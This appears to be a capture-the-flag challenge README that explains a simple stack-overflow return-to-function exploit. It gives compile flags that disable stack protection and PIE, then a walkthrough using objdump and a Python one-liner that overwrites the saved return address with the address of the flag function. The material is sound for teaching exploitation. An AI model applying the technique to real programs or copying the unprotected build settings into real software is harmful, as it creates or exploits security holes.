# Jack the ROPper (Jack - @omnifocal1)

## Very simple ROP
- Binary has a function that never gets called (which prints flag)
- Reverse and see:
    - Input with bad bounds checking
    - Address of a function that will perform a desired action (printing the flag)
- Overflow saved return address with address of flag function
- Win

## How to compile
- On kali-rolling
- `apt install libc6-dev-i386`
- `gcc -m32 -fno-stack-protector -fno-PIC -no-pie -o jtr jtr.c`

## How to win
- Find the starting address of the win function
    - `objdump -t jtr | grep win`
- Copy the address in the first column and reverse byte order e.g.:
    - `0804849b g     F .text	00000019              win`
    - Becomes: `9b840408`
- Debug the binary to find number of bytes from top of stack to saved EIP
- Build command line to overflow buffer and place win address into saved EIP:
    - `python -c 'print("\x9b\x84\x04\x08" * 12)'`
- Run it!:
    - `python -c 'print("\x9b\x84\x04\x08" * 12)' | ./jtr`
